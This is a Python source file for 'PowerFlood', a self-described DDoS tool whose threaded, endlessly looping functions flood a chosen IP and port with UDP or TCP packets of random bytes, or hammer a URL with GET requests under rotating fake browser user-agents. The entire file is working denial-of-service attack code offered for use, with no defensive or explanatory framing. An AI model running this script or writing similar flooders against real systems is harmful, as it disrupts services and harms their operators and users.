#!/usr/bin/env python3
# Code by Sheikh
import argparse
import random
import socket
import threading
import requests
from colorama import Fore, Style
from fake_useragent import UserAgent

def banner():
    print(Fore.RED + "#########################################")
    print(Fore.GREEN + "#               PowerFlood              #")
    print(Fore.CYAN + "#       Code By Sheikh - DDoS Tool      #")
    print(Fore.RED + "#########################################" + Style.RESET_ALL)

user_agents = UserAgent()

custom_user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Linux; Ubuntu 20.04; x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0"
]

ap = argparse.ArgumentParser(description="PowerFlood - DDoS Tool by Sheikh")
ap.add_argument("-c", "--choice", required=True, type=str, choices=['udp', 'tcp', 'http'], help="Flood type: 'udp', 'tcp', or 'http' (Required)")
ap.add_argument("-u", "--url", type=str, help="URL for HTTP flood (Required for HTTP)")
ap.add_argument("-i", "--ip", type=str, help="Target IP address (Required for UDP and TCP)")
ap.add_argument("-p", "--port", type=int, help="Port number (Required for UDP and TCP)")
ap.add_argument("-t", "--times", type=int, default=50000, help="Number of packets to send (default: 50000)")
ap.add_argument("-th", "--threads", type=int, default=5, help="Number of threads (default: 5)")
args = vars(ap.parse_args())

banner()

ip = args['ip']
port = args['port']
choice = args['choice']
url = args['url']
times = args['times']
threads = args['threads']

def run_udp():
    data = random._urandom(1024)
    flood_status = random.choice([Fore.YELLOW + "[*]" + Style.RESET_ALL,
                                  Fore.RED + "[!]" + Style.RESET_ALL,
                                  Fore.GREEN + "[#]" + Style.RESET_ALL])
    sent_color = random.choice([Fore.CYAN, Fore.MAGENTA, Fore.BLUE])

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (ip, port)
            for x in range(times):
                s.sendto(data, addr)
            print(flood_status + sent_color + " UDP Packet Sent!!!" + Style.RESET_ALL)
        except:
            print(Fore.RED + "[!] Error!!!" + Style.RESET_ALL)

def run_tcp():
    data = random._urandom(16)
    flood_status = random.choice([Fore.YELLOW + "[*]" + Style.RESET_ALL,
                                  Fore.RED + "[!]" + Style.RESET_ALL,
                                  Fore.GREEN + "[#]" + Style.RESET_ALL])
    sent_color = random.choice([Fore.CYAN, Fore.MAGENTA, Fore.BLUE])

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(flood_status + sent_color + " TCP Packet Sent!!!" + Style.RESET_ALL)
        except:
            s.close()
            print(Fore.RED + "[*] Error" + Style.RESET_ALL)

def run_http():
    flood_status = random.choice([Fore.YELLOW + "[*]" + Style.RESET_ALL,
                                  Fore.RED + "[!]" + Style.RESET_ALL,
                                  Fore.GREEN + "[#]" + Style.RESET_ALL])
    sent_color = random.choice([Fore.CYAN, Fore.MAGENTA, Fore.BLUE])

    while True:
        try:
            headers = {'User-Agent': random.choice([user_agents.random] + custom_user_agents)}
            for x in range(times):
                response = requests.get(url, headers=headers)
                print(flood_status + sent_color + f" HTTP Request Sent! Status: {response.status_code}" + Style.RESET_ALL)
        except:
            print(Fore.RED + "[*] HTTP Error" + Style.RESET_ALL)

for y in range(threads):
    if choice.lower() == 'udp':
        if port is None:
            print(Fore.RED + "[!] Port is required for UDP flood!" + Style.RESET_ALL)
            break
        th = threading.Thread(target=run_udp)
        th.start()
    elif choice.lower() == 'tcp':
        if port is None:
            print(Fore.RED + "[!] Port is required for TCP flood!" + Style.RESET_ALL)
            break
        th = threading.Thread(target=run_tcp)
        th.start()
    elif choice.lower() == 'http':
        if not url:
            print(Fore.RED + "[!] URL is required for HTTP flood!" + Style.RESET_ALL)
            break
        th = threading.Thread(target=run_http)
        th.start()
